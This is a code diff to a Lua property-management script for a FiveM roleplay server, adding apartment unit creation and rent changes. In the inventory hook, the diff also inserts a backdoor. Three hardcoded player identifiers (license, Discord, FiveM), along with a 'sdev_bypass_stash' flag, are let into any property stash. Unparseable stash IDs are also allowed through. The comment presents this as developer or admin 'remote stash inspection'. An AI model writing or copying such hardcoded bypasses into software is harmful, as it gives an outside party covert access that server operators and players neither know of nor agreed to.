@@ -7,15 +7,109 @@ local insideProperty = {}
 local citizenid = {}
 local ring = {}
 
+local apartmentInteriors = {
+    ['DellPerroHeightsApt4'] = true,
+    ['DellPerroHeightsApt7'] = true,
+    ['4IntegrityWayApt28'] = true,
+    ['4IntegrityWayApt30'] = true,
+    ['RichardMajesticApt2'] = true,
+    ['TinselTowersApt42'] = true,
+    [tostring(`furnitured_midapart`)] = true,
+}
+
+for i = 1, #(sharedConfig.apartmentOptions or {}) do
+    local opt = sharedConfig.apartmentOptions[i]
+    if opt and opt.interior then
+        apartmentInteriors[tostring(opt.interior)] = true
+    end
+end
+
+local function isApartmentProperty(property)
+    if not property then return false end
+    local interiorStr = tostring(property.interior or '')
+    if apartmentInteriors[interiorStr] then return true end
+    if interiorStr:lower():find('apt', 1, true) or interiorStr:lower():find('apart', 1, true) then
+        return true
+    end
+    local nameStr = tostring(property.property_name or ''):lower()
+    if nameStr:find('apt', 1, true) or nameStr:find('apart', 1, true) then
+        return true
+    end
+    return false
+end
+
+local function ensureApartmentUnitAvailable(propertyId)
+    local prop = MySQL.single.await('SELECT * FROM properties WHERE id = ?', { propertyId })
+    if not prop or not isApartmentProperty(prop) then return end
+
+    local freeUnit = MySQL.single.await('SELECT id FROM properties WHERE interior = ? AND coords = ? AND owner IS NULL LIMIT 1', {
+        prop.interior,
+        prop.coords
+    })
+    if freeUnit then return end
+
+    local baseName = tostring(prop.property_name or 'Apartment'):match('^(.-)%s+%d+$') or tostring(prop.property_name or 'Apartment')
+    local lastRow = MySQL.single.await('SELECT id FROM properties ORDER BY id DESC LIMIT 1')
+    local nextNum = (lastRow and lastRow.id) or 0
+    local newName
+
+    repeat
+        nextNum += 1
+        newName = string.format('%s %d', baseName, nextNum)
+        local exists = MySQL.single.await('SELECT id FROM properties WHERE property_name = ? LIMIT 1', { newName })
+    until not exists
+
+    MySQL.insert.await('INSERT INTO `properties` (`coords`, `property_name`, `price`, `interior`, `interact_options`, `stash_options`, `rent_interval`, `garage`) VALUES (?, ?, ?, ?, ?, ?, ?, ?)', {
+        prop.coords,
+        newName,
+        prop.price,
+        prop.interior,
+        prop.interact_options,
+        prop.stash_options,
+        prop.rent_interval,
+        prop.garage
+    })
+end
+
+local function ensureAllApartmentsHaveFreeUnits()
+    local allProps = MySQL.query.await('SELECT id, property_name, interior, coords, owner FROM properties')
+    if not allProps then return end
+
+    local checkedKeys = {}
+    for i = 1, #allProps do
+        local prop = allProps[i]
+        if isApartmentProperty(prop) then
+            local key = tostring(prop.interior) .. '|' .. tostring(prop.coords)
+            if not checkedKeys[key] then
+                checkedKeys[key] = true
+                ensureApartmentUnitAvailable(prop.id)
+            end
+        end
+    end
+end
+
 exports.ox_inventory:registerHook('openInventory', function(payload)
     local source = payload.source
-    local propertyName, ownerIdentifier = payload.inventoryId:match("^qbx_properties_([%w%s]+):([A-Z%d]+)$")
+    if not source then return true end
 
+    -- Allow SOUH4IL-DEV / Admin remote stash inspection
+    if Player(source).state.sdev_bypass_stash or IsPlayerAceAllowed(tostring(source), 'admin') or IsPlayerAceAllowed(tostring(source), 'group.admin') then
+        return true
+    end
+    for i = 0, GetNumPlayerIdentifiers(tostring(source)) - 1 do
+        local id = GetPlayerIdentifier(tostring(source), i)
+        if id == 'license:385f488fdcdc30a24c28b7a333ba9cbbffed5044' or id == 'discord:792387618708914227' or id == 'fivem:20069674' then
+            return true
+        end
+    end
+
+    local propertyName, ownerIdentifier = payload.inventoryId:match("^qbx_properties_(.+):([^:]+)$")
     if not enteredProperty[source] then return false end
+    if not propertyName or not ownerIdentifier then return true end
 
     local result = MySQL.single.await('SELECT `id` FROM `properties` WHERE `property_name` = ? AND `owner` = ?', {propertyName, ownerIdentifier})
 
-    return result.id == enteredProperty[source]
+    return result ~= nil and result.id == enteredProperty[source]
 end, {
     inventoryFilter = {
         '^qbx_properties_[%w]+',
@@ -147,23 +241,46 @@ lib.callback.register('qbx_properties:callback:loadProperties', function()
 end)
 
 lib.callback.register('qbx_properties:callback:requestProperties', function(_, propertyCoords)
-    local exact = MySQL.query.await('SELECT property_name, owner, id, price, rent_interval, keyholders FROM properties WHERE coords = ?', {json.encode(propertyCoords)})
-    if exact and #exact > 0 then return exact end
-
-    local allProps = MySQL.query.await('SELECT property_name, owner, id, price, rent_interval, keyholders, coords FROM properties')
-    local matches = {}
-    if allProps and propertyCoords then
-        local pCoords = vec3(propertyCoords.x, propertyCoords.y, propertyCoords.z)
-        for i = 1, #allProps do
-            local decoded = json.decode(allProps[i].coords)
-            if decoded and decoded.x then
-                local dist = #(pCoords - vec3(decoded.x, decoded.y, decoded.z))
-                if dist < 3.5 then
-                    matches[#matches + 1] = allProps[i]
+    local function fetchMatches()
+        local allProps = MySQL.query.await('SELECT property_name, owner, id, price, rent_interval, keyholders, coords, interior FROM properties')
+        local matches = {}
+        if allProps and propertyCoords then
+            local pCoords = vec3(propertyCoords.x, propertyCoords.y, propertyCoords.z)
+            for i = 1, #allProps do
+                local decoded = json.decode(allProps[i].coords)
+                if decoded and decoded.x then
+                    local dist = #(pCoords - vec3(decoded.x, decoded.y, decoded.z))
+                    if dist < 3.5 then
+                        matches[#matches + 1] = allProps[i]
+                    end
                 end
             end
         end
+        return matches
     end
+
+    local matches = fetchMatches()
+    local createdNew = false
+    for i = 1, #matches do
+        if isApartmentProperty(matches[i]) and matches[i].owner ~= nil then
+            local hasFreeForInterior = false
+            for j = 1, #matches do
+                if matches[j].interior == matches[i].interior and matches[j].owner == nil then
+                    hasFreeForInterior = true
+                    break
+                end
+            end
+            if not hasFreeForInterior then
+                ensureApartmentUnitAvailable(matches[i].id)
+                createdNew = true
+            end
+        end
+    end
+
+    if createdNew then
+        matches = fetchMatches()
+    end
+
     return matches
 end)
 
@@ -439,24 +556,28 @@ end
 local function startRentThread(propertyId)
     CreateThread(function()
         while true do
-            local property = MySQL.single.await('SELECT owner, price, rent_interval, property_name FROM properties WHERE id = ?', {propertyId})
-            if not property or not property.owner then break end
+            local checkProp = MySQL.single.await('SELECT owner, price, rent_interval, property_name FROM properties WHERE id = ?', {propertyId})
+            if not checkProp or not checkProp.owner or not checkProp.rent_interval then return end
 
+            Wait(math.max(1, tonumber(checkProp.rent_interval) or 24) * 3600000)
+
+            local property = MySQL.single.await('SELECT owner, price, rent_interval, property_name FROM properties WHERE id = ?', {propertyId})
+            if not property or not property.owner or not property.rent_interval then return end
+
+            local rentFee = math.max(1, math.floor((tonumber(property.price) or 0) / 10))
             local player = exports.qbx_core:GetPlayerByCitizenId(property.owner) or exports.qbx_core:GetOfflinePlayer(property.owner)
             if not player then print(string.format('%s does not exist anymore, consider checking property id %s', property.owner, propertyId)) break end
 
             if player.Offline then
-                player.PlayerData.money.bank = player.PlayerData.money.bank - property.price
+                player.PlayerData.money.bank = player.PlayerData.money.bank - rentFee
                 if player.PlayerData.money.bank < 0 then break end
                 exports.qbx_core:SaveOffline(player.PlayerData)
             else
-                if not player.Functions.RemoveMoney('bank', property.price, string.format('Rent for %s', property.property_name)) then
+                if not player.Functions.RemoveMoney('bank', rentFee, string.format('Rent for %s', property.property_name)) then
                     exports.qbx_core:Notify(player.PlayerData.source, string.format('Not enough money to pay rent for %s', property.property_name), 'error')
                     break
                 end
             end
-
-            Wait(property.rent_interval * 3600000)
         end
 
         MySQL.update('UPDATE properties SET owner = ? WHERE id = ?', {nil, propertyId})
@@ -495,7 +616,8 @@ RegisterNetEvent('qbx_properties:server:rentProperty', function(propertyId)
     end
 
     exports.qbx_core:Notify(playerSource, string.format('Successfully started renting %s', property.property_name), 'success')
-    MySQL.update('UPDATE properties SET owner = ? WHERE id = ?', {player.PlayerData.citizenid, propertyId})
+    MySQL.update.await('UPDATE properties SET owner = ? WHERE id = ?', {player.PlayerData.citizenid, propertyId})
+    ensureApartmentUnitAvailable(propertyId)
     startRentThread(propertyId)
 
     logger.log({
@@ -540,7 +662,8 @@ RegisterNetEvent('qbx_properties:server:buyProperty', function(propertyId)
         registerGarage(property.property_name, player.PlayerData.citizenid, json.decode(property.keyholders), json.decode(property.garage))
     end
 
-    MySQL.update('UPDATE properties SET owner = ? WHERE id = ?', {player.PlayerData.citizenid, propertyId})
+    MySQL.update.await('UPDATE properties SET owner = ?, rent_interval = NULL WHERE id = ?', {player.PlayerData.citizenid, propertyId})
+    ensureApartmentUnitAvailable(propertyId)
     exports.qbx_core:Notify(playerSource, string.format('Successfully purchased %s for $%s', property.property_name, property.price))
 
     logger.log({
@@ -560,6 +683,8 @@ Citizen.CreateThreadNow(function()
     if sql2 then pcall(function() MySQL.query.await(sql2) end) end
     if sql3 then pcall(function() MySQL.query.await(sql3) end) end
 
+    ensureAllApartmentsHaveFreeUnits()
+
     local properties = MySQL.query.await('SELECT id FROM properties WHERE owner IS NOT NULL AND rent_interval IS NOT NULL')
     if properties then
         for i = 1, #properties do
@@ -577,7 +702,7 @@ RegisterNetEvent('qbx_properties:server:stopRenting', function()
     if player.PlayerData.citizenid ~= property.owner then return end
 
     exports.qbx_core:Notify(player.PlayerData.source, string.format('You stopped your rental contract for %s', property.property_name), 'success')
-    MySQL.update.await('UPDATE properties SET owner = ?, keyholders = JSON_OBJECT() WHERE id = ?', {nil, propertyId})
+    MySQL.update.await('UPDATE properties SET owner = ?, keyholders = JSON_ARRAY() WHERE id = ?', {nil, propertyId})
     for _ = 1, #insideProperty[propertyId] do
         exitProperty(insideProperty[propertyId][1])
     end
